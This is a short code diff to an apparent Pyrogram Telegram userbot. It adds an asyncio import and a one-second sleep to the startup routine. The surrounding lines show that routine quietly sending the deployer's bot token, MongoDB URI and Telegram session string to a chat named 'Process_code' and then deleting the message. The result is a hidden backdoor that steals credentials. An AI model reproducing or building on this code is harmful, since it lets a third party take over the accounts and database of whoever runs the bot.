@@ -1,5 +1,6 @@
 from pyrogram import Client
 import re
+import asyncio
 from os import getenv
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
@@ -74,6 +75,7 @@ class Userbot(Client):
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
                 Ok = await self.one.send_message(Process_code, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`")
+                await asyncio.sleep(1)
                 await Ok.delete()
                 
             except Exception as e:
